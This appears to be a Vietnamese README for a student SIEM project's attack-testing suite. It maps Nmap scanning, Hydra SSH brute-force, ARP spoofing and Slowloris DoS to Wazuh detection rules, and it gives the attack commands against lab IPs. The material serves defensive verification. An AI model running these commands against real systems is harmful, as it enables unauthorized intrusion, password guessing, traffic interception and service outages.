# SECURITY TESTING & VERIFICATION SUITE

> **Đồ án:** Phân tích và thiết kế hệ thống giám sát và quản lý nhật ký an toàn cho mạng doanh nghiệp  
> **Tài liệu chi tiết:** [Báo cáo thực nghiệm Giai đoạn 5](../docs/reports/phase-5-summary.md)  
> **Công cụ sử dụng:** Kali Linux (Nmap, Hydra, Arpspoof, Slowloris), Ubuntu Server (Wazuh SIEM, Rsyslog, Nginx)

---

## 🎯 Danh mục kịch bản kiểm thử (Test Cases)

| Mã | Kịch bản | Kỹ thuật MITRE ATT&CK | Lớp phòng thủ | Cơ chế phát hiện & Cảnh báo |
| :---: | :--- | :--- | :---: | :--- |
| **TC-01** | Dò quét cổng trinh sát (Nmap) | T1046 - Network Discovery | L3/L4 Extended ACLs | Core Switch ghi nhận `%SEC-6-IPACCESSLOGP` → Wazuh Rule `100100` (Level 10) |
| **TC-02** | Vét cạn mật khẩu SSH (Hydra) | T1110.001 - Brute Force | L7 Auth / PAM | Wazuh Rule `5710` / `5712` (Level 10) → Cảnh báo Telegram tức thời |
| **TC-03** | Nghe lén nội bộ (ARP Spoofing) | T1557.002 - ARP Cache Poisoning | L2 Dynamic ARP Inspection (DAI) | Switch chặn gói ARP sai lệch, ghi log vi phạm |
| **TC-04** | Từ chối dịch vụ (Slowloris DoS) | T1499.002 - Service Exhaustion | L7 Web Server | Nginx `limit_conn` / Wazuh Rule `31101` (Level 10) → Telegram Alert |
| **TC-05** | Tích hợp Agent & Đối soát Log | — | SIEM & SOC Automation | Wazuh Agent đẩy log về SIEM qua TCP 1514, Telegram Bot đẩy cảnh báo |

---

## 🛠️ Hướng dẫn thực thi nhanh trên Kali Linux

### 1. TC-01: Nmap Port Scan
```bash
# Quét SYN stealth kiểm tra các cổng mở
sudo nmap -sS -Pn 192.168.10.20

# Quét định danh dịch vụ và phiên bản
sudo nmap -sV -sC -O -p 22,80 192.168.10.20
```

### 2. TC-02: Hydra SSH Brute-force
*(Lưu ý: Chỉ thực hiện từ máy trạm thuộc dải NOC/SOC `192.168.44.0/24` do ACLs đã khóa SSH từ các VLAN khác)*
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.10.20 -t 4 -vV
```

### 3. TC-03: ARP Spoofing Man-in-the-Middle
```bash
# Bật chuyển tiếp gói tin trên Kali
sudo sysctl -w net.ipv4.ip_forward=1

# Đầu độc bảng ARP giữa Client và Gateway
sudo arpspoof -i eth0 -t 192.168.21.50 192.168.21.1
sudo arpspoof -i eth0 -t 192.168.21.1 192.168.21.50
```

### 4. TC-04: Slowloris HTTP DoS
```bash
python3 -m pip install slowloris
slowloris 192.168.10.20 -p 80 -s 500
```

---

## 📊 Đối soát kết quả
Toàn bộ nhật ký và cảnh báo được kiểm tra qua 2 kênh:
1. **Wazuh Dashboard:** `https://192.168.10.40` (hoặc IP Wazuh Server) → Tab **Security Events**
2. **Kênh Telegram SOC:** Nhận thông báo tự động từ bot thông qua webhook `custom-telegram.py`.
